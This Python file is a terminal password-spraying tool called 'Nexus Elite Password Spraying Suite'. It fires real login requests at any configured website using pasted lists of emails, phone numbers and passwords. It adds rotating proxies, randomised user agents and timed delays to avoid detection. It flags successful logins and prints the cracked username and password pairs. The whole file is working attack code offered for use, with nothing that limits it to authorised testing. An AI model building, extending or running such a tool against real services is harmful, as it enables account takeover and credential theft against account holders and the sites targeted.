import json
import time
import requests
import os
import sys
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ANSI Color Codes for Terminal
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

CONFIG_FILE = "config.json"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

def load_config():
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        # Default config if file missing
        return {
            "targets": {"emails": [], "phones": []},
            "passwords_to_test": [],
            "server_settings": {"custom_url": "", "local_url": "http://127.0.0.1:5000", "mode": "custom", "login_path": "/login", "user_field": "username", "pass_field": "password", "timeout": 10},
            "advanced_settings": {"threads": 3, "proxy_enabled": False, "proxies": [], "random_user_agents": True, "smart_delay": [0, 1]},
            "scan_settings": {"verbose": True}
        }

def save_config(config):
    # Auto-deduplicate before saving
    config['targets']['emails'] = list(dict.fromkeys(config['targets']['emails']))
    config['passwords_to_test'] = list(dict.fromkeys(config['passwords_to_test']))
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
{Colors.PURPLE}Nexus Elite Password Spraying Suite v8.1 (Stable){Colors.END}
{Colors.DIM}--------------------------------------------------{Colors.END}
    """
    print(banner)

def main_menu():
    clear_screen()
    show_banner()
    print(f"{Colors.YELLOW}[ Main Menu ]{Colors.END}")
    print(f"{Colors.GREEN}[1]{Colors.END} Run Elite Security Scan")
    print(f"{Colors.GREEN}[2]{Colors.END} Target & Bulk Configuration")
    print(f"{Colors.GREEN}[3]{Colors.END} Server & Field Settings")
    print(f"{Colors.GREEN}[4]{Colors.END} Stealth & Proxy Settings")
    print(f"{Colors.RED}[0]{Colors.END} Exit")
    
    choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus > {Colors.END}")
    return choice

def spray_task(target, password, url, config, results, successful_targets):
    # Skip if target already found
    if target in successful_targets:
        return False

    headers = {}
    if config['advanced_settings']['random_user_agents']:
        headers['User-Agent'] = random.choice(USER_AGENTS)
    
    proxies = None
    if config['advanced_settings']['proxy_enabled'] and config['advanced_settings']['proxies']:
        p = random.choice(config['advanced_settings']['proxies'])
        proxies = {"http": p, "https": p}
    
    try:
        # Smart Delay
        delay_range = config['advanced_settings'].get('smart_delay', [0, 0])
        delay = random.uniform(delay_range[0], delay_range[1])
        if delay > 0:
            time.sleep(delay)
        
        user_field = config['server_settings'].get('user_field', 'username')
        pass_field = config['server_settings'].get('pass_field', 'password')
        path = config['server_settings'].get('login_path', '/login')
        full_url = url.rstrip('/') + path
        
        payload = {user_field: target, pass_field: password}
        
        # Real HTTP Request
        response = requests.post(full_url, data=payload, headers=headers, proxies=proxies, timeout=config['server_settings']['timeout'], allow_redirects=False)
        
        # Enhanced Success Detection (Anti-False Positive)
        # 1. Check for redirection (common in successful logins)
        is_redirect = response.status_code in [301, 302, 303, 307, 308]
        
        # 2. Check for success keywords in body or headers
        success_indicators = ["logout", "signout", "dashboard", "welcome", "my account", "profile"]
        body_lower = response.text.lower()
        has_indicator = any(ind in body_lower for ind in success_indicators)
        
        # 3. Check if we are NOT still on the login page (if redirection happened)
        not_on_login = True
        if "location" in response.headers:
            redirect_url = response.headers["location"].lower()
            if "login" in redirect_url or "auth" in redirect_url:
                not_on_login = False

        # Final Logic: Redirect to non-login page OR contains success indicator
        is_success = (is_redirect and not_on_login) or has_indicator
        
        if is_success:
            # Double check to prevent duplicates in results
            if target not in successful_targets:
                successful_targets.add(target)
                print(f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Found: {target} -> {password}{Colors.END}")
                results.append({"target": target, "password": password, "time": datetime.now().strftime("%H:%M:%S")})
                return True
        elif config['scan_settings']['verbose']:
            sys.stdout.write(f"{Colors.DIM}[-] Tried {target}:{password} | Status: {response.status_code}{Colors.END}\n")
            sys.stdout.flush()
    except Exception as e:
        if config['scan_settings']['verbose']:
            sys.stdout.write(f"{Colors.RED}[!] Error on {target}: {str(e)[:40]}{Colors.END}\n")
    return False

def run_high_efficiency_scan():
    config = load_config()
    clear_screen()
    show_banner()
    
    url = config['server_settings']['local_url'] if config['server_settings']['mode'] == "local" else config['server_settings']['custom_url']
    
    # Deduplicate lists before starting
    targets = list(dict.fromkeys(config['targets']['emails'] + config['targets']['phones']))
    passwords = list(dict.fromkeys(config['passwords_to_test']))
    threads = config['advanced_settings']['threads']
    
    if not targets or not passwords:
        print(f"{Colors.RED}[!] Targets or Passwords list is empty!{Colors.END}")
        time.sleep(2)
        return

    print(f"{Colors.YELLOW}Target URL: {Colors.CYAN}{url}{config['server_settings'].get('login_path', '')}{Colors.END}")
    print(f"{Colors.YELLOW}Stealth: {Colors.CYAN}{'ON' if config['advanced_settings']['proxy_enabled'] else 'OFF'}{Colors.END} | Threads: {Colors.CYAN}{threads}{Colors.END}")
    print(f"{Colors.YELLOW}Initiating Elite Spray Attack...{Colors.END}\n")

    found_results = []
    successful_targets = set() # To prevent finding multiple passwords for same user in one spray
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for pwd in passwords:
            print(f"{Colors.BLUE}{Colors.BOLD}[*] Spraying password: {pwd}{Colors.END}")
            # Create a list of tasks for the current password across all targets
            futures = [executor.submit(spray_task, target, pwd, url, config, found_results, successful_targets) for target in targets]
            for f in futures: f.result()
    
    print(f"\n{Colors.YELLOW}=== Scan Summary ==={Colors.END}")
    print(f"Total Unique Accounts Found: {Colors.GREEN}{len(found_results)}{Colors.END}")
    for res in found_results:
        print(f" - {res['target']} : {res['password']} (@{res['time']})")
    input(f"\n{Colors.BOLD}Press Enter to return...{Colors.END}")

def target_config():
    while True:
        config = load_config()
        clear_screen()
        show_banner()
        print(f"{Colors.YELLOW}[ Target & Bulk Configuration ]{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} Bulk Add Usernames/Emails (Deduplicated)")
        print(f"{Colors.GREEN}[2]{Colors.END} Bulk Add Passwords (Deduplicated)")
        print(f"{Colors.GREEN}[3]{Colors.END} View Current Lists")
        print(f"{Colors.RED}[0]{Colors.END} Back")
        
        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Targets > {Colors.END}")
        if choice == '1':
            print(f"\n{Colors.WHITE}Paste your list (Press Enter then Ctrl+D):{Colors.END}")
            data = sys.stdin.read().splitlines()
            new_targets = [x.strip() for x in data if x.strip()]
            config['targets']['emails'].extend(new_targets)
            save_config(config) # save_config handles deduplication
            print(f"{Colors.GREEN}[✓] Total unique targets: {len(config['targets']['emails'])}{Colors.END}")
            time.sleep(1)
        elif choice == '2':
            print(f"\n{Colors.WHITE}Paste your list (Press Enter then Ctrl+D):{Colors.END}")
            data = sys.stdin.read().splitlines()
            new_pwds = [x.strip() for x in data if x.strip()]
            config['passwords_to_test'].extend(new_pwds)
            save_config(config)
            print(f"{Colors.GREEN}[✓] Total unique passwords: {len(config['passwords_to_test'])}{Colors.END}")
            time.sleep(1)
        elif choice == '3':
            print(f"\n{Colors.BOLD}Targets ({len(config['targets']['emails'])}):{Colors.END} {config['targets']['emails']}")
            print(f"{Colors.BOLD}Passwords ({len(config['passwords_to_test'])}):{Colors.END} {config['passwords_to_test']}")
            input("\nPress Enter...")
        elif choice == '0':
            break

def server_config():
    while True:
        config = load_config()
        clear_screen()
        show_banner()
        print(f"{Colors.YELLOW}[ Server & Field Settings ]{Colors.END}")
        print(f"1. URL: {Colors.CYAN}{config['server_settings']['custom_url'] if config['server_settings']['mode'] == 'custom' else config['server_settings']['local_url']}{Colors.END}")
        print(f"2. Path: {Colors.CYAN}{config['server_settings'].get('login_path')}{Colors.END}")
        print(f"3. User Field: {Colors.CYAN}{config['server_settings'].get('user_field')}{Colors.END}")
        print(f"4. Pass Field: {Colors.CYAN}{config['server_settings'].get('pass_field')}{Colors.END}")
        print(f"0. Back")
        
        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Server > {Colors.END}")
        if choice == '1':
            config['server_settings']['custom_url'] = input("Base URL: ")
            config['server_settings']['mode'] = "custom"
        elif choice == '2':
            config['server_settings']['login_path'] = input("Path: ")
        elif choice == '3':
            config['server_settings']['user_field'] = input("User Field: ")
        elif choice == '4':
            config['server_settings']['pass_field'] = input("Pass Field: ")
        elif choice == '0':
            break
        save_config(config)

def stealth_config():
    while True:
        config = load_config()
        clear_screen()
        show_banner()
        print(f"{Colors.YELLOW}[ Stealth & Proxy Settings ]{Colors.END}")
        print(f"1. Proxy Enabled: {Colors.CYAN}{config['advanced_settings']['proxy_enabled']}{Colors.END}")
        print(f"2. Add Proxies (Paste List)")
        print(f"3. Random User-Agents: {Colors.CYAN}{config['advanced_settings']['random_user_agents']}{Colors.END}")
        print(f"4. Threads: {Colors.CYAN}{config['advanced_settings']['threads']}{Colors.END}")
        
        current_delay = config['advanced_settings'].get('smart_delay', [0, 0])
        print(f"5. Smart Delay: {Colors.CYAN}{current_delay[0]}s - {current_delay[1]}s{Colors.END}")
        
        print(f"0. Back")
        
        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Stealth > {Colors.END}")
        if choice == '1':
            config['advanced_settings']['proxy_enabled'] = not config['advanced_settings']['proxy_enabled']
        elif choice == '2':
            print(f"\n{Colors.WHITE}Paste proxies (e.g. 1.2.3.4:8080) (Enter then Ctrl+D):{Colors.END}")
            data = sys.stdin.read().splitlines()
            config['advanced_settings']['proxies'] = list(dict.fromkeys([x.strip() for x in data if x.strip()]))
            print(f"{Colors.GREEN}[✓] Total unique proxies: {len(config['advanced_settings']['proxies'])}{Colors.END}")
            time.sleep(1)
        elif choice == '3':
            config['advanced_settings']['random_user_agents'] = not config['advanced_settings']['random_user_agents']
        elif choice == '4':
            try: config['advanced_settings']['threads'] = int(input("Threads: "))
            except: pass
        elif choice == '5':
            try:
                min_d = float(input("Min Delay (seconds): "))
                max_d = float(input("Max Delay (seconds): "))
                config['advanced_settings']['smart_delay'] = [min_d, max_d]
            except: pass
        elif choice == '0':
            break
        save_config(config)

def start():
    while True:
        choice = main_menu()
        if choice == '1':
            run_high_efficiency_scan()
        elif choice == '2':
            target_config()
        elif choice == '3':
            server_config()
        elif choice == '4':
            stealth_config()
        elif choice == '0':
            sys.exit()

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        sys.exit()
